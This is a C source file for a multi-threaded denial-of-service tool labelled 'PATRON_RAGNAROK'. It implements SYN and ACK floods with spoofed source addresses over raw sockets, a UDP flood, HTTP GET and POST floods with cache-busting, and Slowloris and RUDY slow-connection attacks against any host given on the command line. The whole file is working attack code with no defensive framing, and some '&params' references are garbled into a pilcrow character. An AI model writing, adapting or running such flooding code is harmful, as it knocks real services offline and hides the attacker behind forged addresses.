#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netdb.h>

#define SYN_FLOOD       (1 << 0)
#define UDP_FLOOD       (1 << 1)
#define TCP_ACK_FLOOD   (1 << 2)
#define HTTP_GET_FLOOD  (1 << 3)
#define HTTP_POST_FLOOD (1 << 4)
#define SLOWLORIS       (1 << 5)
#define RUDY            (1 << 6)
#define CACHE_BUST      (1 << 7)

volatile sig_atomic_t stop_the_madness = 0;

struct attack_params {
    struct sockaddr_in target_addr_tcp;
    struct sockaddr_in target_addr_udp;
    char target_host[256];
    int vector_mask;
};

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum = 0;
    u_short oddbyte;
    register short answer;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = ~sum;
    return (answer);
}

void *vector_syn_flood(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { pthread_exit(NULL); }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    while (!stop_the_madness) {
        memset(packet, 0, sizeof(packet));
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htonl(rand());
        iph->frag_off = htons(IP_DF);
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = (rand() % 0xFFFFFFFF);
        iph->daddr = params->target_addr_tcp.sin_addr.s_addr;
        iph->check = csum((unsigned short *)packet, sizeof(struct iphdr));
        
        tcph->source = htons(rand() % 65535);
        tcph->dest = params->target_addr_tcp.sin_port;
        tcph->seq = htonl(rand());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(5840);
        tcph->check = 0;
        
        sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)¶ms->target_addr_tcp, sizeof(params->target_addr_tcp));
    }
    close(sock);
    return NULL;
}

void *vector_udp_flood(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    char buffer[1024];
    memset(buffer, 'A', 1024);
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) { pthread_exit(NULL); }
    while (!stop_the_madness) {
        sendto(sock, buffer, sizeof(buffer), 0, (struct sockaddr *)¶ms->target_addr_udp, sizeof(params->target_addr_udp));
    }
    close(sock);
    return NULL;
}

void *vector_ack_flood(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    char packet[sizeof(struct iphdr) + sizeof(struct tcphdr)];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) { pthread_exit(NULL); }
    int one = 1;
    setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    while(!stop_the_madness) {
        memset(packet, 0, sizeof(packet));
        
        iph->ihl = 5;
        iph->version = 4;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
        iph->id = htonl(rand());
        iph->frag_off = htons(IP_DF);
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->saddr = (rand() % 0xFFFFFFFF);
        iph->daddr = params->target_addr_tcp.sin_addr.s_addr;
        iph->check = csum((unsigned short *)packet, sizeof(struct iphdr));

        tcph->source = htons(rand() % 65535);
        tcph->dest = params->target_addr_tcp.sin_port;
        tcph->seq = htonl(rand());
        tcph->ack_seq = htonl(rand());
        tcph->doff = 5;
        tcph->ack = 1;
        tcph->window = htons(5840);
        tcph->check = 0;
        
        sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)¶ms->target_addr_tcp, sizeof(params->target_addr_tcp));
    }
    close(sock);
    return NULL;
}

void *vector_http_flood(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    char request[2048];
    char path[512];
    char post_data[] = "data=ragnarok";

    while (!stop_the_madness) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        if (connect(sock, (struct sockaddr *)¶ms->target_addr_tcp, sizeof(params->target_addr_tcp)) < 0) {
            close(sock);
            continue;
        }

        if (params->vector_mask & CACHE_BUST) {
            sprintf(path, "/?r=%d", rand());
        } else {
            strcpy(path, "/");
        }
        
        if (params->vector_mask & HTTP_POST_FLOOD) {
            sprintf(request, "POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: PATRON_RAGNAROK\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %ld\r\n\r\n%s", path, params->target_host, strlen(post_data), post_data);
        } else {
            sprintf(request, "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: PATRON_RAGNAROK\r\nConnection: close\r\n\r\n", path, params->target_host);
        }
        
        send(sock, request, strlen(request), 0);
        close(sock);
        usleep(100);
    }
    return NULL;
}

void *vector_slowloris(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    char request[512];
    
    while(!stop_the_madness){
        sprintf(request, "GET /?%d HTTP/1.1\r\nHost: %s\r\nUser-Agent: PATRON_RAGNAROK_SLOW\r\n", rand(), params->target_host);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        if(connect(sock, (struct sockaddr *)¶ms->target_addr_tcp, sizeof(params->target_addr_tcp)) < 0){
            close(sock);
            continue;
        }
        send(sock, request, strlen(request), 0);
        while(send(sock, "X-a: b\r\n", 8, 0) > 0 && !stop_the_madness){
            sleep(10);
        }
        close(sock);
    }
    return NULL;
}

void *vector_rudy(void *args) {
    struct attack_params *params = (struct attack_params *)args;
    char request_header[512];
    
    while(!stop_the_madness) {
        sprintf(request_header, "POST /?%d HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 999999\r\n\r\n", rand(), params->target_host);
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if(sock < 0) continue;
        if(connect(sock, (struct sockaddr *)¶ms->target_addr_tcp, sizeof(params->target_addr_tcp)) < 0){
            close(sock);
            continue;
        }
        send(sock, request_header, strlen(request_header), 0);
        while(send(sock, "a", 1, 0) > 0 && !stop_the_madness) {
            sleep(10);
        }
        close(sock);
    }
    return NULL;
}

void signal_handler(int sig_num) {
    if (sig_num == SIGINT) {
        stop_the_madness = 1;
    }
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    srand(time(NULL));

    if (argc != 6) return 1;

    struct attack_params params;
    memset(¶ms, 0, sizeof(params));
    int num_threads = 100;

    strncpy(params.target_host, argv[1], sizeof(params.target_host) - 1);
    params.target_addr_tcp.sin_port = htons(atoi(argv[2]));
    params.target_addr_udp.sin_port = htons(atoi(argv[3]));
    num_threads = atoi(argv[4]);
    params.vector_mask = atoi(argv[5]);
    
    struct hostent *he = gethostbyname(params.target_host);
    if (he == NULL) return 1;
    
    params.target_addr_tcp.sin_family = AF_INET;
    params.target_addr_udp.sin_family = AF_INET;
    memcpy(¶ms.target_addr_tcp.sin_addr, he->h_addr_list[0], he->h_length);
    memcpy(¶ms.target_addr_udp.sin_addr, he->h_addr_list[0], he->h_length);

    if (params.target_addr_udp.sin_port == 0) {
        params.target_addr_udp.sin_port = params.target_addr_tcp.sin_port;
    }
    
    typedef void *(*attack_func)(void *);
    struct {
        int mask;
        attack_func func;
    } vector_map[] = {
        {SYN_FLOOD, vector_syn_flood},
        {UDP_FLOOD, vector_udp_flood},
        {TCP_ACK_FLOOD, vector_ack_flood},
        {HTTP_GET_FLOOD, vector_http_flood},
        {HTTP_POST_FLOOD, vector_http_flood},
        {SLOWLORIS, vector_slowloris},
        {RUDY, vector_rudy}
    };

    int num_vectors = sizeof(vector_map)/sizeof(vector_map[0]);
    int total_threads = 0;
    
    for (int i=0; i < num_vectors; i++) {
        if (params.vector_mask & vector_map[i].mask) {
             if (vector_map[i].mask == HTTP_POST_FLOOD && params.vector_mask & HTTP_GET_FLOOD) continue;
            total_threads += num_threads;
        }
    }

    if (total_threads == 0) return 0;

    pthread_t *threads = malloc(total_threads * sizeof(pthread_t));
    if (threads == NULL) return 1;
    int thread_idx = 0;

    for (int i = 0; i < num_vectors; i++) {
        if (params.vector_mask & vector_map[i].mask) {
             if (vector_map[i].mask == HTTP_POST_FLOOD && params.vector_mask & HTTP_GET_FLOOD) continue;
            for (int j = 0; j < num_threads; j++) {
                if (thread_idx < total_threads) {
                    pthread_create(&threads[thread_idx++], NULL, vector_map[i].func, ¶ms);
                }
            }
        }
    }
    
    for (int i = 0; i < thread_idx; i++) {
        pthread_join(threads[i], NULL);
    }
    
    free(threads);
    return 0;
}